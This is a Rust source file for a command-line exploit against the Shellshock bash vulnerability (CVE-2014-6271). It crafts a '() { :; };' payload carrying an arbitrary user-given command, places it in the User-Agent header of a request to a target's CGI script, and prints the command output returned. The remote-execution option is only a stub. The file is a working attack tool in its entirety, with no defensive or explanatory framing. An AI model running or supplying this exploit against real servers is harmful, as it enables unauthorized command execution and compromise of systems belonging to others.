use clap::Parser;
use std::net::IpAddr;
use std::process;
use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};

/// Exploit the Shellshock CVE-2014â€“6271
#[derive(Parser, Debug)]
#[command(version)]
struct Args {
    /// Target IP
    #[arg(long)]
    ip: IpAddr,

    /// Command you want to execute
    #[arg(short, long)]
    command: Option<String>,

    /// Obtain Remote Control Execution
    #[arg(long, default_value_t = false)]
    rce: bool,
}

fn validate_args(args: &Args) -> Result<(), String> {
    // Verify that only one of the two parameters is provided
    if args.command.is_some() && args.rce {
        return Err(String::from("\n[!] Error: Only one of '--command' or '--rce' can be specified, not both.\n"));
    }

    // Verify that at least one of the two parameters is provided
    if args.command.is_none() && !args.rce {
        return Err(String::from("\n[!] Error: Either '--command' or '--rce' must be specified.\n"));
    }

    Ok(())
}

fn send_shellshock_command(ip: IpAddr, command: &str) -> Result<(), String> {
    let url = format!("http://{}/cgi-bin/vulnerable.cgi", ip);
    let client = Client::new();
    
    let mut headers = HeaderMap::new();
    
    println!("[*] Crafting payload");
    // Crafting the Shellshock payload with the correct format
    let payload = format!(
        "() {{ :; }}; /bin/bash -c 'echo Content-type: text/html; echo; {}'",
        command
    );
    
    println!("[*] Sending the request");
    headers.insert(USER_AGENT, HeaderValue::from_str(&payload).map_err(|e| e.to_string())?);

    // Sending the request
    let response = client
        .get(&url)
        .headers(headers)
        .send()
        .map_err(|e| e.to_string())?;

    if response.status().is_success() {
        println!("\n[*] Exploit sent successfully!");
        // Try to read and print the response body
        let body = response.text().map_err(|e| e.to_string())?;
        println!("[*] Response from the server:\n{}", body);
    } else {
        return Err(format!("[!] Request failed with status: {}", response.status()));
    }

    Ok(())
}

fn main() {
    let args = Args::parse();

    // Validating the arguments
    if let Err(e) = validate_args(&args) {
        eprintln!("{}", e);
        process::exit(1);
    }

    // Displaying the arguments
    println!("\nTarget IP: {}", args.ip);

    if let Some(command) = args.command {
        println!("Command: {}", command);
        // Send the Shellshock exploit request with the provided command
        if let Err(e) = send_shellshock_command(args.ip, &command) {
            eprintln!("{}", e);
            process::exit(1);
        }
    } else if args.rce {
        println!("Remote Control Execution: {}", args.rce);
        // Placeholder for implementing remote control execution if needed
    }
}
